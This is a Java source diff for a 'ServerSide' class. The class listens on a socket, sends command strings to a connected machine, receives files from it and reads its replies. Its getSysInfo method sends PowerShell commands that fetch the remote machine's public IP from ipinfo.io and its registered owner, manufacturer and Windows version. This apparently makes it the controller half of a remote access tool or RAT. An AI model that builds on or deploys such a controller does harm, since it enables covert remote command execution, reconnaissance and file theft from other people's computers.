@@ -7,35 +7,44 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.ServerSocket;
 import java.net.Socket;
 
-public class Connection {
-	private Socket _s;
-	private DataOutputStream _dout;
-	private DataInputStream _din;
+import org.apache.commons.io.IOUtils;
+
+public class ServerSide {
+	private Socket s;
+	private ServerSocket ss;
+	private DataOutputStream dout;
+	private DataInputStream din;
 	
-	public Connection(Socket s) throws IOException {
-		_s = s;
-		_dout = new DataOutputStream(s.getOutputStream());
-		_din = new DataInputStream(s.getInputStream());
+	private int _port;
+	
+	public ServerSide(int port){
+		_port = port;
+	}
+
+	public void connect() throws IOException{
+		ss = new ServerSocket(_port);
+		s = ss.accept();
+		System.gc(); //Calls the garbage collector because of the previous function
+		dout = new DataOutputStream(s.getOutputStream());
+		din = new DataInputStream(s.getInputStream());
 	}
 	
 	public String send(String str) throws IOException {
-		_dout.writeUTF(str);
-		_dout.flush();
+		dout.writeUTF(str);
+		dout.flush();
 		
-		return _din.readUTF();
-	}
-	
-	public String receive() throws IOException {
-		return _din.readUTF();
+		return din.readUTF();
 	}
 	
 	public long receive(String fileName) throws IOException {
 	    int length = Integer.valueOf(receive());
 	    byte [] mybytearray  = new byte [length];
 		
-	    InputStream is = _s.getInputStream();
+	    InputStream is = s.getInputStream();
 	    FileOutputStream out = new FileOutputStream(new File(fileName));
 	    BufferedOutputStream bos = new BufferedOutputStream(out);
 	    
@@ -62,26 +71,33 @@ public class Connection {
 		
 		return length;
 	}
-
-	public void end() throws IOException {
-		_s.close();
+	
+	public String receive() throws IOException {
+		return din.readUTF();
 	}
 
+	public void end() throws IOException {
+		dout.close();
+		din.close();
+		s.close();
+		ss.close();
+	}
+	
 	public boolean connectionIsOpen() {
-		return !_s.isClosed();
+		return !s.isClosed();
 	}
 	
 	public String getSysInfo() throws IOException {
 		String sysInfo = "[not found]";
 		
-		if(_s.isConnected()) {
-			_dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
-			_dout.flush();
-			sysInfo = "\n" + "Public ip: " + _din.readUTF();
+		if(s.isConnected()) {
+			dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
+			dout.flush();
+			sysInfo = "\n" + "Public ip: " + din.readUTF();
 			
-			_dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
-			_dout.flush();
-			sysInfo += _din.readUTF();
+			dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
+			dout.flush();
+			sysInfo += din.readUTF();
 		}
 		
 		return sysInfo;
